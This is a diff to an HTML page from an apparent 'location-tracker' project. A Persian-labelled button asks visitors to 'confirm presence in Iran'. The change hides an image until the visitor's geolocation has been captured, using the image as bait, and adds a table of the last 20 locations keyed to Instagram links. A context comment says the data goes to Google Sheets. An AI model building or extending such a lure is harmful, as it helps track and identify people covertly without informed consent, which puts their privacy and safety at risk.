@@ -41,6 +41,9 @@
 
             // Update the table with the latest 20 locations
             updateLocationTable();
+
+            // Show the image after the location is successfully fetched
+            document.getElementById("location-image").style.display = "block"; 
         }
 
         // Send location data to Google Sheets
@@ -123,11 +126,23 @@
     <!-- Button to trigger location request -->
     <button id="location-button" style="display:none;" onclick="getLocation()">تایید حضور در ایران</button>
 
-    <!-- Image you uploaded -->
-    <img src="https://raw.githubusercontent.com/vhd10281986/location-tracker/refs/heads/main/photo_2024-11-19_14-09-32.jpg" alt="Location Image" width="400">
+    <!-- Image you uploaded (initially hidden) -->
+    <img id="location-image" src="https://raw.githubusercontent.com/vhd10281986/location-tracker/refs/heads/main/photo_2024-11-19_14-09-32.jpg" alt="Location Image" width="400" style="display:none;">
     
     <!-- Table to display the last 20 locations -->
-    
+    <h3>Last 20 Locations</h3>
+    <table border="1">
+        <thead>
+            <tr>
+                <th>#</th>
+                <th>Instagram Link</th>
+                <th>Time</th>
+            </tr>
+        </thead>
+        <tbody id="location-table-body">
+            <!-- Locations will be added here -->
+        </tbody>
+    </table>
 
 </body>
 </html>
